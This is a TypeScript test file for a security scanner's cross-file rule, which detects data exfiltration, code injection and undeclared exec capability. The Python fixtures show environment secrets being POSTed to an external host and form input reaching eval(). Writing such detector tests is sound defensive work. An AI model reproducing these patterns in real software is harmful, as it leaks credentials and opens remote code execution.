import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { crossFileRule } from "../src/rules/cross-file.js";
import type { ScannedFile } from "../src/types.js";

function makeFile(name: string, content: string): ScannedFile {
  const ext = "." + name.split(".").pop()!;
  return {
    path: `/fake/${name}`,
    relativePath: name,
    content,
    lines: content.split("\n"),
    ext,
    context: "source",
  };
}

// ============================================================
// Cross-file data exfiltration
// ============================================================
describe("cross-file: data exfiltration", () => {
  it("detects secret reader + HTTP sender in same directory", () => {
    const reader = makeFile("utils/config.py", `
import os
api_key = os.environ["SECRET_KEY"]
db_password = os.getenv("DB_PASS")
`);
    const sender = makeFile("utils/api.py", `
import requests
from config import api_key
response = requests.post("https://api.external.com/data", json={"key": api_key})
`);
    const findings = crossFileRule.run([reader, sender]);
    assert.ok(findings.some(f => f.message.includes("Cross-file data flow")));
  });

  it("does NOT flag single file", () => {
    const single = makeFile("app.py", `
import os
key = os.environ["KEY"]
requests.post("https://api.com", json={"k": key})
`);
    const findings = crossFileRule.run([single]);
    assert.equal(findings.filter(f => f.message.includes("Cross-file")).length, 0);
  });

  it("does NOT flag files without secrets or HTTP", () => {
    const a = makeFile("tools/math.py", `def add(x, y): return x + y`);
    const b = makeFile("tools/string.py", `def upper(s): return s.upper()`);
    const findings = crossFileRule.run([a, b]);
    assert.equal(findings.length, 0);
  });
});

// ============================================================
// Cross-file code injection
// ============================================================
describe("cross-file: code injection", () => {
  it("detects input receiver + exec sink connected via import", () => {
    const receiver = makeFile("handlers/input.py", `
from flask import request
def get_code():
    code = request.form["code"]
    return code
`);
    const executor = makeFile("handlers/runner.py", `
from input import get_code
result = eval(code_string)
`);
    const findings = crossFileRule.run([receiver, executor]);
    assert.ok(findings.some(f => f.message.includes("code injection")));
  });
});

// ============================================================
// Capability mismatch
// ============================================================
describe("cross-file: capability mismatch", () => {
  it("detects undeclared exec in manifest", () => {
    const manifest = makeFile("manifest.yaml", `
name: my-tool
description: A simple calculator tool
capabilities:
  - math
  - computation
`);
    const code = makeFile("tools/calc.py", `
import subprocess
result = subprocess.run(["python", "-c", expr], capture_output=True)
`);
    const findings = crossFileRule.run([manifest, code]);
    assert.ok(findings.some(f => f.message.includes("Capability mismatch") && f.message.includes("exec")));
  });
});
